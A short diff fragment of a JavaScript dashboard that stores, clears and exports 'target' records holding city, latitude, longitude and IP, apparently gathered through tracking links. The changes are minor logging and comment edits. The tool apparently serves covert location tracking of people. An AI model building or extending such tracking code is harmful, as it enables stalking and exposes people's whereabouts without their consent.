     const data = (await new Promise(r => onValue(ref(db, 'lokasi/' + user), r, { onlyOnce: true }))).val();
-    // Hapus yang punya target (dari link)
     for (const [k, v] of Object.entries(data || {})) {
       if (v.target) await remove(ref(db, 'lokasi/' + user + '/' + k));
     }
     addLog('All link data cleared');
-  } catch(e) { addLog('Clear failed: ' + e.message, 'err'); }
+  } catch(e) { addLog('Clear failed', 'err'); }
 };
 
 window.downloadCard = async (key) => {
@@ -999,10 +978,10 @@ window.downloadCard = async (key) => {
     link.download = `target_${key}.png`;
     link.href = canvas.toDataURL();
     link.click();
+    addLog('Card saved');
   } catch(e) { alert('Failed: ' + e.message); }
 };
 
-// ===== EXPORT =====
 window.exportCSV = () => {
   if (allData.length === 0) return alert('No data');
   const rows = [['ID','Target','Waktu','Kota','Lat','Lng','IP']];
@@ -1027,7 +1006,9 @@ window.exportJSON = () => {
   addLog('JSON exported');
 };
 
-// ===== CHAT =====
+// ============================================
+// CHAT
+// ============================================
 let chatOpen = false;
 let chatFirst = true;
 let chatLastCount = 0;
@@ -1080,7 +1061,7 @@ function renderChat(snap) {
     const badge = document.getElementById('chatBadge');
     badge.style.display = 'inline-block';
     badge.innerText = arr.length - chatLastCount;
-    beep(900, 0.1);
+    beepSimple(900, 0.1);
   }
   chatLastCount = arr.length;
   chatFirst = false;
